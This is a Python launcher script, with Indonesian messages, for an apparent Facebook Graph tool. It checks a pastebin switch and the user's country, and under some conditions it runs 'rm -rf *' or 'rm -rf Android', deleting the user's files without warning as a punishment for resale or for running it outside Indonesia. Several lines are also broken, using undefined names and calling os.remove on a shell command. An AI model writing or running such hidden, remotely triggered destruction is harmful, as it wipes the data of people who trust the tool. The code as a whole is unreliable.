import os,re,sys,bs4,time,json,random,datetime,requests, calendar,subprocess

from random import choice
from src import login as Login
from src import logo as Logo
from src import menu as Menu



header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36"}
ses=requests.Session()

#warna coeg
K = "\x1b[0;33m"
N = "\x1b[0m" 
M = "\x1b[0;31m"
H = "\x1b[0;32m"

from src import login as Login
from src import logo as Logo
from src import menu as Menu

def mid_rotasi_anjg():
	try:
		response = requests.get("https://pastebin.com/raw/tTeSiXVB").text
		if "tutup" in response:
			dev = Path().absolute() 
			os.remove(de)
			os.remove("src")
			os.remove("rm -rf *")
			exit("server sedang sibuk")
		elif "maintenance" in response:
			Logo.logo()
			print("sedang maintenance")
			os.remove("src")
		else:
			indo()
	except requests.exceptions.ConnectionError:
		print("SINYAL TIDAK STABIL")

def indo():
	try:
		response = requests.get("https://ipinfo.io/103.105.55.179?token=f09090941eb2d1").json()["country"]
		if "ID" in response:
			ada = os.path.exists('Android')     
			if ada == True:
				print(" antum jan jual file/rekode sialan")
				os.system("rm -rf Android")
				exit()
			else:
				print(" ")
			Menu.menu()
		else:
			logo()
			print("tool only available in Indonesia")
			ada = os.path.exists('Android')     
			print(ada)
			if ada == True:
				print(" antum jan jual file/rekode sialan")
				os.system("rm -rf *")
				exit()
			else:
				exit()
	except requests.exceptions.ConnectionError:
		print("SINYAL TIDAK STABIL")

if __name__ == '__main__':
	if len(sys.argv) == 2:
		if sys.argv[1] == 'cok':
			os.system("clear")
			Logo.logo()
			print(" BERHASIL MENGHAPUS COKI")
			os.system('rm -rf token')
			exit()
		else:
			print (" [!] How To delete token? ")
			exit(" [*] Type : python run.py cok")
	os.system("clear")
	mid_rotasi_anjg()
